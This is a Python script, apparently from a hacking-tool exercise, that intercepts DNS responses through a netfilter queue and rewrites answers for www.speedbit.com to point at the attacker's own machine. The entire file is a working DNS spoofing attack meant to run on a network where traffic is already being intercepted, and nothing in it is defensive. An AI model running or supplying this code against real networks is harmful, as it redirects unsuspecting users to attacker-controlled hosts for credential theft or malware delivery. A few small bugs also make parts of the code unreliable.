#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import argparse
import subprocess
import re
import sys

def getArgs():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="iface", help="The name of the interface you wish to use for this spoof (i.e. eth0, wlan0, etc.).  Use 'ifconfig' to find out which interface you should use.")
    args = parser.parse_args()
    if not args.iface:
        print("\nMust specify an interface.  Please type 'arpSpoof -h' for guidance on this utility.  Exiting program...\n")
        exit()
    else:
        return args
def assignSpoofIP():
    opt = getArgs()
    ifconfigresult = subprocess.check_output(["ifconfig", opt.iface])
    ipSearchResult = re.search(r"\d+\.\d+\.\d+\.\d+", str(ifconfigresult))
    if ipSearchResult:
        spoofIP = ipSearchResult.group(0)
        return spoofIP
    else:
        print("Could not obtain host IP.")
        exit()
def processPkt(pkt):
    scapyPkt = scapy.IP(pkt.get_payload())
    if scapyPkt.haslayer(scapy.DNSRR):
        qname = scapyPkt[scapy.DNSQR].qname
        if "www.speedbit.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=assignSpoofIP())
            scapyPkt[scapy.DNS].an = answer
            scapyPkt[scapy.DNS].ancount = 1

            del scapyPkt[scapy.IP].len
            del scapyPkt[scapy.IP].chksum
            del scapyPkt[scapy.UDP].chksum
            del scapyPkt[scapy.UDP].len

            pkt.set_payload(str(scapyPkt))

    pkt.accept()

try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, processPkt)
    queue.run()
except AttributeError:
    print("\r[+] "+sys.stdout)
except KeyboardInterrupt:
    print("\n[+] Ctrl+C Detected.  Exiting program...\n")
    exit()
